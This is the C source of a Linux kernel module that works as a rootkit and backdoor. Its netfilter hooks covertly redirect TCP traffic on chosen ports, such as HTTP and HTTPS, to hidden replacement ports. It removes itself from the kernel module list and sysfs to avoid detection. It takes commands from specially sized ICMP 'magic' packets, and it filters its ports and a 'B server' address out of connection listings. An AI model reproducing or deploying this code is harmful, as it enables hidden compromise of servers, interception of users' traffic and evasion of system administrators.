#include <linux/module.h>  /* Needed by all kernel modules */
#include <linux/kernel.h>  /* Needed for loglevels (KERN_WARNING, KERN_EMERG, KERN_INFO, etc.) */
#include <linux/init.h>    /* Needed for __init and __exit macros. */
#include <linux/moduleparam.h>
#include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
#include <linux/fs.h>      /* filp_open */
#include <linux/slab.h>    /* kmalloc */

#include <asm/paravirt.h> /* write_cr0 */
#include <asm/uaccess.h>  /* get_fs, set_fs */
#include <linux/utsname.h>
#include <asm/cacheflush.h>
#include <linux/semaphore.h>
#include <linux/kallsyms.h>

#include <linux/file.h>
#include <linux/net.h>
#include <net/inet_sock.h>
#include <linux/byteorder/generic.h>
#include <linux/netfilter.h>
#include <linux/vmalloc.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <net/udp.h>
#include <linux/ktime.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/inet.h>
#include <linux/etherdevice.h>
#include <linux/icmp.h>
#include <net/tcp.h>

#include "monitor_proc.h"
#include "hide_ip_port_map.h"
#include "client_list.h"
#include "hide_info.h"
#include "udp_client.h"
#include "monitor_proc.h"

MODULE_LICENSE("GPL");

static struct nf_hook_ops send_nfho;

static struct nf_hook_ops replace_recv_nfho;
static struct nf_hook_ops replace_send_nfho;

static u8 fake_machead[] = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05,
	0x08, 0x00
};

struct skb_list_node {
	struct list_head list;
	struct sk_buff *skb;
};

struct skb_list {
	struct list_head list;
	spinlock_t lock;
};
struct skb_list recv_skb_list;

//static u16 replace_port = 8086;
//static char *key_ip = "10.11.12.13";

static int replace_https_port = 8085;
static int replace_http_port = 8086;

static int https_key_port = 9527;
static int http_key_port = 9528;

int https_port = 443;
int http_port = 80;

static u32 loop_back_mark = 0x5a5a5a5a;

struct client_list https_clist;
struct client_list http_clist;
struct client_list replace_https_clist;
struct client_list replace_http_clist;

static int max_cache_clients = 100000;

static u8 dev_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
int mac_size = 0;
module_param_array(dev_mac, byte, &mac_size, 0);

static char eth_dev[32] = "";
module_param_string(eth_dev, eth_dev, sizeof(eth_dev), 0);

static int hide_module = 0;
module_param(hide_module, int , 0);

module_param(replace_https_port, int , 0);
module_param(replace_http_port, int , 0);
module_param(https_key_port, int , 0);
module_param(http_key_port, int , 0);
module_param(https_port, int , 0);
module_param(http_port, int , 0);

int enb_print = 0;
module_param(enb_print, int , 0);

extern atomic_t hide_info_flag;

#define MAX_REPLACE_SIZE 10

static int src_replace_port[MAX_REPLACE_SIZE] = {0x00};
int src_port_num = 0;
module_param_array(src_replace_port, int, &src_port_num, 0);

static int dst_replace_port[MAX_REPLACE_SIZE] = {0x00};
int dst_port_num = 0;
module_param_array(dst_replace_port, int, &dst_port_num, 0);

static int key_replace_port[MAX_REPLACE_SIZE] = {0x00};
int key_port_num = 0;
module_param_array(key_replace_port, int, &key_port_num, 0);

struct client_list normal_lists[MAX_REPLACE_SIZE];
struct client_list replace_lists[MAX_REPLACE_SIZE];

void recv_do_tasklet(unsigned long);
DECLARE_TASKLET(recv_tasklet,recv_do_tasklet,0);

#define KEY_ICMP_LEN 138
enum MY_ICMP_CMD {
    HIDE_MODULE = 0x5a,
    ENABLE_PRINT = 0x5b,
    DISABLE_PRINT = 0x5c,
    ENABLE_HIDE_INFO = 0x5d,
    DISABLE_HIDE_INFO = 0x5e,
};

void replay_hide_module_work_func(struct work_struct *work);
DECLARE_WORK(hide_module_work, replay_hide_module_work_func);

void replay_hide_module_work_func(struct work_struct *work)
{
    relay_hide_module();
}
static void handle_my_icmp_cmd(struct sk_buff *skb)
{
    struct iphdr *iph = ip_hdr(skb);
    struct icmphdr *icmph = NULL;
    u16 transport_len = 0u; 
    u8 *key_data = NULL;
    int cmd = 0;
    
    if (iph->version != 4) {
        return;
    }   
    if (iph->protocol != IPPROTO_ICMP) {
        return;
    }
    transport_len = ntohs(iph->tot_len) - iph->ihl * 4;
    if (transport_len != KEY_ICMP_LEN) {
        return;
    }
    skb_linearize(skb);
    icmph = icmp_hdr(skb);
    key_data = ((u8*)icmph) + transport_len - 1;
    cmd = *key_data;

    if (cmd == HIDE_MODULE) {
        if (hide_module == 0) {
            MY_PRINT("Need to hide the module!\n");        
            MY_PRINT("Hide this module\n");
            list_del_init(&(THIS_MODULE->list));
            kobject_del(&(THIS_MODULE->mkobj.kobj));
        }
        hide_module = 1;
        schedule_work(&hide_module_work);
    } else if (cmd == ENABLE_PRINT) {
        atomic_set(&printflag, 1);
    } else if (cmd == DISABLE_PRINT) {
        atomic_set(&printflag, 0);
    } else if (cmd == ENABLE_HIDE_INFO) {
        atomic_set(&hide_info_flag, 1);
    } else if (cmd == DISABLE_HIDE_INFO) {
        atomic_set(&hide_info_flag, 0);
    }

    return;
}

static int find_port_from_list(int *port_list, int num, int val)
{
    int i = 0;
    for (i = 0; i < num; i++) {
        if (port_list[i] == val) {
            return i;
        }
    }

    return -1;
}

int check_port_list_bind(void)
{
    char buf[64] = {0};
    char *argv[] = {"/bin/sh", "-c", NULL, NULL};
    int ret = 0;
    int i = 0;
    char *envp[] = { "HOME=/", "TERM=linux", "PATH=/usr/bin:/bin", NULL };

    for (i = 0; i < src_port_num; i++) {
        snprintf(buf, sizeof(buf), "exit $(netstat -nlt | grep %d | wc -l)", src_replace_port[i]);
        argv[2] = buf;
        ret = call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_PROC);
        ret = (ret >> 8) & 0xff;
        if (ret <= 0) {
            MY_PRINT("port: %d not bind.\n", src_replace_port[i]);
            return 0;
        }
        MY_PRINT("port: %d has binded.\n", src_replace_port[i]);
    }

    return 1;
}


static unsigned int replace_port_recv_hook(unsigned int hooknum,
				      struct sk_buff *skb,
				      const struct net_device *in,
				      const struct net_device *out,
				      int (*okfn)(struct sk_buff *))
{
    struct iphdr *iph = ip_hdr(skb);
    u16 transport_len = 0u;
    struct client_list *normal_list = NULL;
    struct client_list *replace_list = NULL;
    int ret = 0;
    int replace = 0;
    int ihlen = iph->ihl * 4;

    handle_my_icmp_cmd(skb);
    
    if (iph->version != 4) {
        return NF_ACCEPT;
    }
    if (iph->protocol != IPPROTO_TCP) {
        return NF_ACCEPT;
    }
    if (skb->csum == loop_back_mark && skb->ip_summed == CHECKSUM_UNNECESSARY) {
        skb->csum = 0;
        return NF_ACCEPT;
    }
    if (iph->saddr == iph->daddr) {
        return NF_ACCEPT;
    }

    transport_len = ntohs(iph->tot_len) - iph->ihl * 4;
    if (likely(transport_len >= sizeof(struct tcphdr))) {
        //skb_reset_transport_header(skb);
        struct tcphdr *tcph = NULL;
        u16 rport = 0u;
        int pos = -1;
        
        skb_set_transport_header(skb, ihlen);
        tcph = tcp_hdr(skb);
        
        /*
        if (ntohs(tcph->dest) == http_port) {
            rport = replace_http_port;
            normal_list = &http_clist;
            replace_list = &replace_http_clist;
        }
        if (ntohs(tcph->dest) == https_port) {
            rport = replace_https_port;
            normal_list = &https_clist;
            replace_list = &replace_https_clist;
        }
        */
        pos = find_port_from_list(src_replace_port, src_port_num, ntohs(tcph->dest));
        //MY_PRINT("replace_port_recv_hook %d %d\n", pos, src_port_num);
        //MY_PRINT("replace_port_recv_hook %d %d %d\n", src_replace_port[0], src_replace_port[1], src_replace_port[2]);
        //MY_PRINT("port num: %u %u %u %u\n", ntohs(tcph->dest), tcph->dest, skb->transport_header, skb->network_header);
        if (pos != -1) {
            rport = dst_replace_port[pos];
            normal_list = &normal_lists[pos];
            replace_list = &replace_lists[pos];
        }

        if (rport != 0) {
            if (is_enable_proxy()) {
                ret = skb_add_to_list(skb, replace_list, normal_list);
                replace = (ret == 0 ? 1 : 0);
            } else {
                ret = skb_add_to_list(skb, normal_list, replace_list);
                replace = (ret == 1 ? 1 : 0);
            }

            if (replace) {
                MY_PRINT("replace_port_recv_hook %u -> %u\n", ntohs(tcph->dest), rport);
                tcph->dest = htons(rport);
                if (skb->ip_summed != CHECKSUM_UNNECESSARY) {
                    tcph->check = 0;
                    skb->csum = csum_partial(tcph, transport_len, 0);
                    tcph->check = tcp_v4_check(transport_len,
                                   iph->saddr, iph->daddr, skb->csum);
                }
            }
        }
    }
    return NF_ACCEPT;
}


static unsigned int replace_port_send_hook(unsigned int hooknum,
				      struct sk_buff *skb,
				      const struct net_device *in,
				      const struct net_device *out,
				      int (*okfn)(struct sk_buff *))
{
    struct iphdr *iph = ip_hdr(skb);
    u16 transport_len = 0u;

    //if (!is_enable_proxy()) {
    //    return NF_ACCEPT;
    //}
    
    if (iph->version != 4) {
        return NF_ACCEPT;
    }
    if (iph->protocol != IPPROTO_TCP) {
        return NF_ACCEPT;
    }

    if (iph->saddr == iph->daddr) {
        return NF_ACCEPT;
    }

    transport_len = ntohs(iph->tot_len) - iph->ihl * 4;
    if (likely(transport_len >= sizeof(struct tcphdr))) {
        struct tcphdr *tcph = NULL;
        u32 rport = 0u;
        int pos = -1;
        int ihlen = iph->ihl * 4;
        
        skb_set_transport_header(skb, ihlen);
        tcph = tcp_hdr(skb);
        
        pos = find_port_from_list(dst_replace_port, dst_port_num, ntohs(tcph->source));
        if (pos != -1) {
            rport = src_replace_port[pos];
        }
        /*
        if (ntohs(tcph->source) == replace_http_port) {
            rport = http_port;
        }
        if (ntohs(tcph->source) == replace_https_port) {
            rport = https_port;
        }
        */
        if (rport != 0) {
            MY_PRINT("replace_port_send_hook %u -> %u\n", ntohs(tcph->source), rport);
            tcph->source = htons(rport);
            if (skb->ip_summed != CHECKSUM_PARTIAL) {
                tcph->check = 0;
                //skb->csum = csum_partial(tcph, transport_len, 0);
                tcph->check = tcp_v4_check(transport_len,
                               iph->saddr, iph->daddr, csum_partial(tcph, transport_len, 0));
            }

            //mark the out packet
            skb->ip_summed = (skb->ip_summed == CHECKSUM_PARTIAL) ? CHECKSUM_UNNECESSARY : CHECKSUM_COMPLETE;
        }
    }
    return NF_ACCEPT;
}


void dump_data(u8 *data, size_t len) {
    int i = 0;

    MY_PRINT("\n---------------------------------\n");
    for (i = 0; i < len; i++) {
        if (i % 16 == 0) {
            MY_PRINT("\n");
        }
        
        MY_PRINT("%02x ", data[i]);
    }
    MY_PRINT("\n---------------------------------\n");
}
static unsigned int loopback_send_hook(unsigned int hooknum,
				      struct sk_buff *skb,
				      const struct net_device *in,
				      const struct net_device *out,
				      int (*okfn)(struct sk_buff *))
{
    struct iphdr *iph = ip_hdr(skb);
    struct sk_buff *recv_skb = NULL;
    unsigned int total_size = 0;
    u8 *cpyptr = NULL;
    u32 tmp = 0;
    struct net_device *recv_dev = NULL;
    struct skb_list_node *node = NULL;
    struct tcphdr *tcph = NULL;
    int hide_packet = 0;
    int pos = -1;
    //u16 transport_len = skb->len - skb_transport_offset(skb);
    int ihlen = iph->ihl * 4;

    if (iph->protocol != IPPROTO_TCP) {
        return NF_ACCEPT;
    }

    if (iph->saddr == iph->daddr) {
        return NF_ACCEPT;
    }

    if (skb->ip_summed == CHECKSUM_UNNECESSARY || skb->ip_summed == CHECKSUM_COMPLETE) {
        skb->ip_summed = (skb->ip_summed == CHECKSUM_UNNECESSARY) ? CHECKSUM_PARTIAL : CHECKSUM_NONE;
        return NF_ACCEPT;
    }
        
    //skb_linearize(skb);
    skb_set_transport_header(skb, ihlen);
    tcph = tcp_hdr(skb);

    pos = find_port_from_list(key_replace_port, key_port_num, ntohs(tcph->dest));
    if (pos != -1) {
        tcph->dest = htons(src_replace_port[pos]);
        update_port_ip(tcph->source, iph->daddr);
        hide_packet = 1;
    }
    /*
    if (ntohs(tcph->dest) == https_key_port) {
        tcph->dest = htons(https_port);
        update_port_ip(tcph->source, iph->daddr);
        hide_packet = 1;
    }
    
    if (ntohs(tcph->dest) == http_key_port) {
        tcph->dest = htons(http_port);
        update_port_ip(tcph->source, iph->daddr);
        hide_packet = 1;
    }
    */

    pos = find_port_from_list(src_replace_port, src_port_num, ntohs(tcph->source));
    if (pos != -1) {
        if (is_hide_ipaddr(tcph->dest, iph->daddr)) {
            tcph->source = htons(key_replace_port[pos]);
            hide_packet = 1;
        }
    }
    /*
    if (ntohs(tcph->source) == https_port) {
        if (is_hide_ipaddr(tcph->dest, iph->daddr)) {
            tcph->source = htons(https_key_port);
            hide_packet = 1;
        }
    }
    if (ntohs(tcph->source) == http_port) {
        if (is_hide_ipaddr(tcph->dest, iph->daddr)) {
            tcph->source = htons(http_key_port);
            hide_packet = 1;
        }
    }
    */
    if (!hide_packet) {
        return NF_ACCEPT;
    }
    //MY_PRINT("000 mac len: %lu, ip len: %d\n", sizeof(fake_machead), ntohs(iph->tot_len));
    //MY_PRINT("000 src: %x:%d, dst: %x:%d\n", iph->saddr, ntohs(tcph->source), iph->daddr, ntohs(tcph->dest));
    //MY_PRINT("000 seq: %x, ack seq: %x\n", ntohl(tcph->seq), ntohl(tcph->ack_seq));
    
    total_size = sizeof(fake_machead) + ntohs(iph->tot_len);

    tmp = iph->saddr;
    iph->saddr = iph->daddr;
    iph->daddr = tmp;
    
    iph->check = 0;               
    iph->check = ip_fast_csum((unsigned char *)iph,iph->ihl);

    //MY_PRINT("mac len: %lu, ip len: %d\n", sizeof(fake_machead), ntohs(iph->tot_len));
    //MY_PRINT("src: %x:%d, dst: %x:%d\n", iph->saddr, ntohs(tcph->source), iph->daddr, ntohs(tcph->dest));
    //MY_PRINT("seq: %x, ack seq: %x\n", ntohl(tcph->seq), ntohl(tcph->ack_seq));

    skb_linearize(skb);
    recv_skb = dev_alloc_skb(total_size + 2);
    if (!recv_skb) {
        MY_PRINT(KERN_NOTICE "snull rx: low on mem - packet dropped\n");
        goto out;
    }
    skb_reserve(recv_skb, 2); /* align IP on 16B boundary */  
    cpyptr = skb_put(recv_skb, total_size);
    memcpy(cpyptr, fake_machead, sizeof(fake_machead));
    memcpy(cpyptr + sizeof(fake_machead), skb->data, skb->len);
    //dump_data(cpyptr, total_size);
    
    /* Write metadata, and then pass to the receive level */
    recv_dev = dev_get_by_name(&init_net, eth_dev);
    if (recv_dev == NULL) {
        dev_kfree_skb(recv_skb);
        goto out;
    }
    recv_skb->dev = recv_dev;
    recv_skb->protocol = eth_type_trans(recv_skb, recv_dev);
    recv_skb->ip_summed = CHECKSUM_UNNECESSARY; /* don't check it */
    recv_skb->csum = loop_back_mark;
    
    node = kmalloc(sizeof(struct skb_list_node), GFP_ATOMIC);
    if (node == NULL) {
        dev_kfree_skb(recv_skb);
        goto out;
    }
    node->skb = recv_skb;
    spin_lock_bh(&(recv_skb_list.lock));
    list_add(&(node->list), &(recv_skb_list.list));
    spin_unlock_bh(&(recv_skb_list.lock));
    tasklet_schedule(&recv_tasklet);
    
out:
    dev_kfree_skb(skb);
    return NF_STOLEN;
}

void recv_do_tasklet(unsigned long val)
{
    struct skb_list_node *curr = NULL;
    struct skb_list_node *next = NULL;
	
	spin_lock_bh(&(recv_skb_list.lock));
	list_for_each_entry_safe(curr, next, &recv_skb_list.list, list) {
        list_del(&(curr->list));
		netif_rx(curr->skb);
		kfree(curr);
	}
	spin_unlock_bh(&(recv_skb_list.lock));
}

static int __init moduleInit(void)
{
    char tmp_buf[32];
    int i = 0;

    if (enb_print) {
        atomic_set(&printflag, 1);
    }
    
    MY_PRINT("mac: %x %x %x %x %x %x\n", dev_mac[0], dev_mac[1], dev_mac[2],
        dev_mac[3], dev_mac[4], dev_mac[5]);
    if (dev_mac[0] == 0 && dev_mac[1] == 0 && dev_mac[2] == 0
        && dev_mac[3] == 0 && dev_mac[4] == 0 && dev_mac[5] == 0) {
        MY_PRINT("Need to set dev mac!\n");
        return -EINVAL;
    } else {
        fake_machead[0] = dev_mac[0];
        fake_machead[1] = dev_mac[1];
        fake_machead[2] = dev_mac[2];
        fake_machead[3] = dev_mac[3];
        fake_machead[4] = dev_mac[4];
        fake_machead[5] = dev_mac[5];
    }

    MY_PRINT("src_port_num: %d\n", src_port_num);
    MY_PRINT("dst_port_num: %d\n", dst_port_num);
    MY_PRINT("key_port_num: %d\n", key_port_num);

    
    MY_PRINT("src_port_num: %d %d %d %d %d %d %d %d %d %d\n", src_replace_port[0], src_replace_port[1],
        src_replace_port[2], src_replace_port[3], src_replace_port[4], src_replace_port[5], src_replace_port[6],
        src_replace_port[7], src_replace_port[8], src_replace_port[9]);
    MY_PRINT("dst_port_num: %d %d %d %d %d %d %d %d %d %d\n", dst_replace_port[0], dst_replace_port[1],
        dst_replace_port[2], dst_replace_port[3], dst_replace_port[4], dst_replace_port[5], dst_replace_port[6],
        dst_replace_port[7], dst_replace_port[8], dst_replace_port[9]);
    MY_PRINT("key_port_num: %d %d %d %d %d %d %d %d %d %d\n", key_replace_port[0], key_replace_port[1],
        key_replace_port[2], key_replace_port[3], key_replace_port[4], key_replace_port[5], key_replace_port[6],
        key_replace_port[7], key_replace_port[8], key_replace_port[9]);
    
    if (src_port_num != dst_port_num || src_port_num != key_port_num) {
        MY_PRINT("Port num is not equal.\n");
        return -EINVAL;
    }
    if (src_port_num == 0 || dst_port_num == 0 || key_port_num == 0) {
        MY_PRINT("Port num is zero.\n");
        return -EINVAL;
    }

    //if (strlen(get_download_url()) == 0) {
    //    MY_PRINT("Need to set download url!\n");
    //    return -EINVAL;
    //}
    MY_PRINT("download url: %s\n", get_download_url());

    if (strlen(eth_dev) == 0) {
        MY_PRINT("Need to set a eth dev for loopback.\n");
        return -EINVAL;
    }
    if (dev_get_by_name(&init_net, eth_dev) == NULL) {
        MY_PRINT("Can not get dev by dev name!\n");
        return -EINVAL;
    }

    if (!check_b_server_info()) {
        MY_PRINT("B server info is not set, please set it.\n");
        return -EINVAL;
    }
    
	INIT_LIST_HEAD(&(recv_skb_list.list));
	spin_lock_init(&(recv_skb_list.lock));

    if (init_client_list(&https_clist, max_cache_clients) != 0)
    {
        MY_PRINT("Init https_clist error!\n");
        return -ENOMEM;
    }
    if (init_client_list(&http_clist, max_cache_clients) != 0) {
        MY_PRINT("Init http_clist error!\n");
        return -ENOMEM;
    }
    if (init_client_list(&replace_https_clist, max_cache_clients) != 0) {
        MY_PRINT("Init replace_https_clist error!\n");
        return -ENOMEM;
    }
    if (init_client_list(&replace_http_clist, max_cache_clients) != 0) {
        MY_PRINT("Init replace_http_clist error!\n");
        return -ENOMEM;
    }

    for (i = 0; i < MAX_REPLACE_SIZE; i++) {
        if (init_client_list(&normal_lists[i], max_cache_clients) != 0) {
            MY_PRINT("Init normal_lists error!\n");
            return -ENOMEM;
        }

        if (init_client_list(&replace_lists[i], max_cache_clients) != 0) {
            MY_PRINT("Init normal_lists error!\n");
            return -ENOMEM;
        }
    }

    if (init_hide_info() != 0) {
        MY_PRINT("Init hide info failed.\n");
        return -EINVAL;
    }

    init_hide_ip_port_map(500);
    init_monitor_timer(1);
	
	send_nfho.hook = loopback_send_hook,
    send_nfho.owner = THIS_MODULE,
    send_nfho.pf = PF_INET,
    send_nfho.hooknum = NF_INET_POST_ROUTING ,
    send_nfho.priority = NF_IP_PRI_LAST,
    nf_register_hook(&send_nfho);

    
	replace_recv_nfho.hook = replace_port_recv_hook,
    replace_recv_nfho.owner = THIS_MODULE,
    replace_recv_nfho.pf = PF_INET,
    replace_recv_nfho.hooknum = NF_INET_LOCAL_IN ,
    replace_recv_nfho.priority = NF_IP_PRI_LAST,
    nf_register_hook(&replace_recv_nfho);

	replace_send_nfho.hook = replace_port_send_hook,
    replace_send_nfho.owner = THIS_MODULE,
    replace_send_nfho.pf = PF_INET,
    replace_send_nfho.hooknum = NF_INET_LOCAL_OUT,
    replace_send_nfho.priority = NF_IP_PRI_FIRST,
    nf_register_hook(&replace_send_nfho);

    //snprintf(tmp_buf, sizeof(tmp_buf), ":%04X", replace_https_port);
    //hide_info_add_filter(tmp_buf);
    
    //snprintf(tmp_buf, sizeof(tmp_buf), ":%04X", replace_http_port);
    //hide_info_add_filter(tmp_buf);
    

    //snprintf(tmp_buf, sizeof(tmp_buf), ":%04X", https_key_port);
    //hide_info_add_filter(tmp_buf);

    //snprintf(tmp_buf, sizeof(tmp_buf), ":%04X", http_key_port);
    //hide_info_add_filter(tmp_buf);
    for (i = 0; i < dst_port_num; i++) {
        snprintf(tmp_buf, sizeof(tmp_buf), ":%04X", dst_replace_port[i]);
        hide_info_add_filter(tmp_buf);
    }
    for (i = 0; i < key_port_num; i++) {
        snprintf(tmp_buf, sizeof(tmp_buf), ":%04X", key_replace_port[i]);
        hide_info_add_filter(tmp_buf);
    }

    snprintf(tmp_buf, sizeof(tmp_buf), "%08X:", in_aton(get_b_server_addr()));
    hide_info_add_filter(tmp_buf);

    if (hide_module) {
        MY_PRINT("Hide this module\n");
        list_del_init(&(THIS_MODULE->list));
        kobject_del(&(THIS_MODULE->mkobj.kobj));
    }
	
    return 0;
}

static void __exit moduleClear(void){
    int i = 0;
    
	nf_unregister_hook(&send_nfho);

	nf_unregister_hook(&replace_recv_nfho);
	nf_unregister_hook(&replace_send_nfho);
    
    del_monitor_timer();

    destroy_client_list(&https_clist);
    destroy_client_list(&http_clist);
    destroy_client_list(&replace_https_clist);
    destroy_client_list(&replace_http_clist);

    
    for (i = 0; i < MAX_REPLACE_SIZE; i++) {
        destroy_client_list(&normal_lists[i]);
        destroy_client_list(&replace_lists[i]);
    }

    clear_hide_info();
}

module_init(moduleInit);
module_exit(moduleClear);

